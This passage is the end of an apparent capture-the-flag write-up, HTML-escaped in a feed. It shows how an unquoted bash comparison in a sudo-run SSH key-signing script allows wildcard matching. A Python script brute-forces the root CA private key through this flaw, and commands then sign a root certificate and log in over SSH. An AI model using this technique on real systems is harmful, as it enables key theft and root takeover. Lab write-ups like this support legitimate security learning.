+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh-keygen -s &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$ca_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -z &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$serial&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -I &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$username&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -V -1w:forever -n &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$principals&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$public_key_name&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is similar to the previous script, but in here instead of using API, we can directly provide the &lt;code>ca_file&lt;/code>. There&amp;rsquo;s an if statement that checks if the provided &lt;code>ca_file&lt;/code> is &lt;code>/etc/ssh/ca-it&lt;/code>, if it is true then it will print the usage and exit.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129224415.webp">&lt;/figure>
+&lt;p>The one thing to notice here is that the script first reads the content of both &lt;code>/etc/ssh/ca-it&lt;/code> and the file we provide and tries to match the content. And specifically in that line:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> $itca &lt;span style="color:#fe8019">==&lt;/span> $ca &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It tries to match the content without surrounding the variables in quotest &lt;code>&amp;quot;&lt;/code>, which makes it possible to pattern match. Let&amp;rsquo;s explain that with an example:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>pass&lt;span style="color:#fe8019">=&lt;/span>$1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root_pass&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;secretpass&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> $root_pass &lt;span style="color:#fe8019">==&lt;/span> $pass &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Access granted!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Wrong password!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here when we enter &lt;code>*&lt;/code> as the password, the script will match it with the password and we can easily bypass the check.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129205356.webp">&lt;/figure>
+&lt;p>In this example th password is hardcoded inside the script. Now what if the script have suid bit set and reads the password from another file which only the root user have permission to. Another thing we can try is exfiltrate the password by exploiting this wilcard matching.
+For example we can try to find the first letter by trying all the letter one by one and add &lt;code>*&lt;/code> at the end. Since the password here is &lt;code>secretpass&lt;/code>, the password &lt;code>a*&lt;/code> fails and &lt;code>s*&lt;/code> works.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129205900.webp">&lt;/figure>
+&lt;p>We can keep doing this until we exfiltrate the whole password using a small script.
+The same method can be applied to create a script to leak the content of &lt;code>/etc/ssh/ca-it&lt;/code> file.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> string
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> subprocess
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> os
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chars &lt;span style="color:#fe8019">=&lt;/span> string&lt;span style="color:#fe8019">.&lt;/span>ascii_uppercase &lt;span style="color:#fe8019">+&lt;/span> string&lt;span style="color:#fe8019">.&lt;/span>ascii_lowercase &lt;span style="color:#fe8019">+&lt;/span> string&lt;span style="color:#fe8019">.&lt;/span>digits &lt;span style="color:#fe8019">+&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;+/&lt;/span>&lt;span style="color:#b8bb26">\n&lt;/span>&lt;span style="color:#b8bb26">-= &amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ca &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;test-ca&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leaked_key&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;-----BEGIN OPENSSH PRIVATE KEY-----
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">is_valid_ca&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#fe8019">=&lt;/span> subprocess&lt;span style="color:#fe8019">.&lt;/span>run(
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">f&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;sudo /opt/sign_key.sh &lt;/span>&lt;span style="color:#b8bb26">{&lt;/span>ca&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26"> ctf-root.pub root root_user 1337&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stdout&lt;span style="color:#fe8019">=&lt;/span>subprocess&lt;span style="color:#fe8019">.&lt;/span>PIPE,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stderr&lt;span style="color:#fe8019">=&lt;/span>subprocess&lt;span style="color:#fe8019">.&lt;/span>PIPE,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shell&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">True&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Use API for signing with this CA.&amp;#34;&lt;/span> &lt;span style="color:#fe8019">in&lt;/span> output&lt;span style="color:#fe8019">.&lt;/span>stdout&lt;span style="color:#fe8019">.&lt;/span>decode()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">while&lt;/span> &lt;span style="color:#fe8019">not&lt;/span> leaked_key&lt;span style="color:#fe8019">.&lt;/span>endswith(&lt;span style="color:#b8bb26">&amp;#39;-----END OPENSSH PRIVATE KEY----&amp;#39;&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">for&lt;/span> s &lt;span style="color:#fe8019">in&lt;/span> chars:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">with&lt;/span> &lt;span style="color:#fabd2f">open&lt;/span>(ca, &lt;span style="color:#b8bb26">&amp;#39;w&amp;#39;&lt;/span>) &lt;span style="color:#fe8019">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f&lt;span style="color:#fe8019">.&lt;/span>write(leaked_key &lt;span style="color:#fe8019">+&lt;/span> s &lt;span style="color:#fe8019">+&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;*&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> is_valid_ca():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> leaked_key &lt;span style="color:#fe8019">=&lt;/span> leaked_key &lt;span style="color:#fe8019">+&lt;/span> s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os&lt;span style="color:#fe8019">.&lt;/span>system(&lt;span style="color:#b8bb26">&amp;#39;clear&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">print&lt;/span>(leaked_key)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">print&lt;/span>(leaked_key)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now execute the script, it will take some time to leak the entire file content.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129232152.webp">&lt;/figure>
+&lt;p>Now let&amp;rsquo;s create an ssh key for root and let&amp;rsquo;s sign it using the CA.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf-root
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh-keygen -s ca-root -I root -n root_user ctf-root.pub
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129232949.webp">&lt;/figure>
+&lt;p>Now let&amp;rsquo;s login as root&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh root@10.10.11.27 -p &lt;span style="color:#d3869b">2222&lt;/span> -i ctf-root -o CertificateFile&lt;span style="color:#fe8019">=&lt;/span>ctf-root-cert.pub
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129233357.webp">&lt;/figure>
+&lt;h4 id="reference">Reference:&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.php.net/manual/en/phar.using.stream.php">&lt;code>phar://&lt;/code> wrapper&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://rudrasarkar.medium.com/exploiting-phar-stream-wrapper-d2140592c6e7">Exploiting phar stream wrapper&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://en.wikipedia.org/wiki/HAR_(file_format)">HAR&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.lorier.net/docs/ssh-ca.html">Certification Authority key&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d">SSH at scale CAs and Principals&lt;/a>&lt;/li>
+&lt;/ul></content></item></channel></rss>
